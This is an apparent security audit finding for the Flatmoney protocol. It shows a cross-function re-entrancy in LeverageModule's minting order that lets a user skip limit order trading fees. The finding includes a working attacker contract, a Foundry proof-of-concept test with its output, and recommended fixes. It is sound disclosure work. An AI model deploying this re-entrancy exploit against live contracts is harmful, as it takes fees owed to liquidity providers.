Boxy Garnet Wolverine

high

# A malicious user can bypass limit order trading fees via cross-function re-entrancy

## Summary
A malicious user can bypass limit order trading fees via cross-function re-entrancy, since `_safeMint` makes an external call to the user before updating state.

## Vulnerability Detail
In the `LeverageModule` contract, the `_mint` function calls `_safeMint`, which makes an external call to the receiver of the NFT (the `to` address).

<details>
<summary>LeverageModule::_mint()</summary>

```javascript
function _mint(address _to) internal returns (uint256 _tokenId) {
        _tokenId = tokenIdNext;

        _safeMint(_to, tokenIdNext);

        tokenIdNext += 1;
}
```
</details>

Only after this external call, `vault.setPosition()` is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of  `_positions[_tokenId]` in FlatcoinVault is not up-to-date.

<details>

<summary>LeverageModule::executeOpen()</summary>

```javascript
_newTokenId = _mint(_account); // Here, an attack gains control of execution

vault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
    _newTokenId
);
```

> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

</details>

This outdated state of `_positions[_tokenId]` can be exploited by an attacker once the external call has been made. They can re-enter `LimitOrder::announceLimitOrder()` and provide the tokenId that has just been minted.
In that function, the trading fee is calculated as follows:

```javascript
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
```
However since the position has not been created yet (due to state being updated after an external call), this results in the `tradeFee` being 0 since `vault.getPosition(tokenId).additionalSize` returns the default value of a uint256 (0), and `tradeFee` = fee * size.

Hence, when the limit order is executed, the trading fee (`tradeFee`) charged to the user will be `0`.

## Impact
A malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing `stableCollateralTotal`, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

## Proof of Concept
Summary:
1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements `IERC721Receiver`.
2. Once the keeper executes the order, the contract is called, with the function `onERC721Received(address,address,uint256,bytes)`
3. The function calls `LimitOrder::announceLimitOrder()` to create the desired limit order to close the position. (stop loss, take profit levels)
4. The contract then returns `msg.sig` (the function signature of the executing function) to satify the `IERC721Receiver`'s requirement.

To run this proof of concept:
1. Add 2 files `AttackerContract.sol` and `ReentrancyPoC.t.sol` to `flatcoin-v1/test/unit` in the project's repo.
2. run `forge test --mt test_tradingFeeBypass -vv` in the terminal

<details><summary>Attacker Contract</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {Setup} from "../helpers/Setup.sol";
import {LimitOrder} from "src/LimitOrder.sol";

contract AttackerContract {

    LimitOrder limitOrderProxy;

    function setLimitOrderProxy(address limitOrderAddress) external {
        limitOrderProxy = LimitOrder(limitOrderAddress);
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // Do the cross-function re-entrancy
        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);

        // Return the function signature (required by the standard)
        return msg.sig;
        // Note: Also could return `this.onERC721Received.selector` or `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
    }
}
```
</details>

<details>
<summary>Proof of Concept (Foundry Test)</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {AttackerContract} from "./AttackerContract.sol";
import {Setup} from "../helpers/Setup.sol";

contract ReentrancyPoC is Setup, OrderHelpers {
    function test_tradingFeeBypass() public {
        
        // Set up and initialize the attacker's contract
        AttackerContract attackerContract = new AttackerContract();
        attackerContract.setLimitOrderProxy(address(limitOrderProxy));

        // Deal the exploiter contract with WETH + ETH
        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.
        deal(address(attackerContract), 100_000e18); // Loading account with native token.

        uint256 aliceBalanceBefore = WETH.balanceOf(alice);
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: address(attackerContract),
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Get the limit order that has been created by the attacker's contract
        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);

        // Get the order's data
        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));
        
        ///////////////////////
        // POC Assertions    //
        ///////////////////////
        // Assert that the tradeFee for the limit order is 0
        assertEq(orderData.tradeFee, 0);

        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.
        assertEq(orderData.priceLowerThreshold, 750e18);


        ///////////////////////
        // Other Assertions  //
        ///////////////////////
        // The following assertions are copied from another test in the test suite-

        // ERC721 token assertions:
        {
            (uint256 buyPrice, ) = oracleModProxy.getPrice();
            // Position 0:
            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);
            assertEq(position0.lastPrice, buyPrice, "Entry price is not correct");
            assertEq(position0.marginDeposited, 10e18, "Margin deposited is not correct");
            assertEq(position0.additionalSize, 30e18, "Size is not correct");
            assertEq(tokenId, 0, "Token ID is not correct");
        }
        // PnL assertions:
        {
            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);
            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();

            // Check that before the WETH price change, there is no profit or loss change
            assertEq(positionSummary0.profitLoss, 0, "Pnl for user 0 is not correct");
            assertEq(
                positionSummary0.marginAfterSettlement,
                10e18,
                "Margin after settlement for user 0 is not correct"
            ); // full margin available
        }
    }  
}
```

</details>

<details>
<summary> Console Output </summary>

```powershell
Running 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC
[PASS] test_tradingFeeBypass() (gas: 2006498)
Logs:
  tradeFee: 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## Tool used
Manual Review

## Recommendation
To fix this specific issue, the following change is sufficient:
```diff
-_newTokenId = _mint(_account); 

vault.setPosition( 
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
-   _newTokenId
+   tokenIdNext
);
+_newTokenId = _mint(_account); 
``` 
However there are still more state changes that would occur after the `_mint` function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move `_mint` all the way to the end of `LeverageModule::executeOpen()`.

Otherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within `LimitOrder::announceLimitOrder()` to ensure that the `positions[_tokenId]` is not uninitialized:

```diff
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);

+require(additionalSize > 0, "Additional Size of a position cannot be zero");

```
